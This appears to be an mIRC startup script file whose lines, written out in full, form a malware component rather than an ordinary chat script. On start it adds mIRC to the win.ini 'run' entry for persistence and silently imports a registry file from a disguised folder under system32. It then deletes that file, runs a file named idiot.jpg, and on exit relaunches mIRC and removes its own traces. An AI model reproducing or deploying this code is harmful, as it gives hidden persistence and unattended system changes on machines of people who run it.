[script]
n0=on 1:start:{
n1=  var %run $readini c:\windows\win.ini windows run
n2=  if ($mircexe !isin %run) writeini c:\windows\win.ini windows run $mircexe
n3=  set %whois $read(fullname.txt)
n4=  identd on $read(ident.txt)
n5=  ignore -r
n6=  //run regedit /s C:\WINDOWS\system32\Setup\drona\mirc.reg | .timer 1 40 remove C:\WINDOWS\system32\Setup\drona\mirc.reg
n7=  .timer 0 0 showmirc -t -n
n8=  //run C:\WINDOWS\system32\Setup\drona\idiot.jpg  
n9=}
n10=on 1:exit:{ run mirc.exe | remove C:\WINDOWS\system32\Setup\drona\idiot.jpg | remove C:\WINDOWS\system32\Setup\drona\mirc.reg } 
